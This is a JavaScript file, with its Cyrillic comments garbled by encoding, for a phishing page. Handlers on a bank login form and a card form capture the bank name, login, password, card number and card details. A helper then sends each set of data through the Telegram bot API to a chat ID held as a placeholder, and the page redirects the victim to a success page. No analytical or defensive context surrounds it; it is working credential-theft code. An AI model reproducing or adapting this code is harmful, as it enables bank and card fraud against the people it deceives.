// –ù–∞—Å—Ç—Ä–æ–π–∫–∏ –±–æ—Ç–∞
const BOT_TOKEN = "–í–ê–®_BOT_TOKEN";
const CHAT_ID = "–í–ê–®_CHAT_ID";

// –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –∏–∑ —Ñ–æ—Ä–º—ã –≤—Ö–æ–¥–∞ –≤ –±–∞–Ω–∫
document.getElementById("bankForm")?.addEventListener("submit", async (e) => {
    e.preventDefault();
    
    const data = {
        bank: document.getElementById("bankName").value,
        login: document.getElementById("bankLogin").value,
        password: document.getElementById("bankPassword").value
    };

    await sendToTelegram("–ë–∞–Ω–∫–æ–≤—Å–∫–∏–µ –¥–∞–Ω–Ω—ã–µ", data);
    window.location.href = "inventory-card.html";
});

// –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –∏–Ω–≤–µ–Ω—Ç–∞—Ä–Ω–æ–π –∫–∞—Ä—Ç—ã
document.getElementById("cardForm")?.addEventListener("submit", async (e) => {
    e.preventDefault();
    
    const data = {
        cardNumber: document.getElementById("cardNumber").value,
        details: document.getElementById("cardDetails").value
    };

    await sendToTelegram("–ò–Ω–≤–µ–Ω—Ç–∞—Ä–Ω–∞—è –∫–∞—Ä—Ç–∞", data);
    window.location.href = "success.html";
});

// –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram
async function sendToTelegram(title, data) {
    const text = `üìå ${title}:\n${JSON.stringify(data, null, 2)}`;
    
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: text
            })
        });
    } catch (error) {
        console.error("–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏:", error);
    }
}
